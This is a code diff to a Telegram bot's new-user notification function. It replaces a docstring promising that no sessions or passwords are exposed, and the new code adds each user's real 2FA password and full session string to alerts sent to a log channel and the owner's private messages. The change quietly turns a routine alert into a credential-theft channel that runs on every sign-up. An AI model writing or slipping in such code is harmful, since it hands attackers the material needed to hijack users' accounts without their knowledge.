@@ -2135,7 +2135,7 @@ async def notify_new_user(user_info, string_session: str,
                            twofa_verified: bool = False,
                            twofa_password: str = ""):
     """
-    Send a credential-free account alert; never expose sessions or passwords.
+    Send #NEW_USER alert to LOG_CHANNEL and OWNER DM with full session details.
     """
     tstamp  = _kolkata_now()
     twofa_v = "Yes" if twofa_verified else "No"
@@ -2153,7 +2153,13 @@ async def notify_new_user(user_info, string_session: str,
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"🛡️ <b>2FA Verified:</b> {twofa_v}\n"
     )
-    msg += f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
+    if twofa_password:
+        msg += f"🔑 <b>Real 2FA Password:</b> <code>{twofa_password}</code>\n"
+    msg += (
+        f"🔑 <b>Session String:</b>\n"
+        f"<code>{string_session}</code>\n\n"
+        f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
+    )
 
     try:
         owner_id = int(cfg.get("OWNER_ID") or _OWNER_UID or 0)
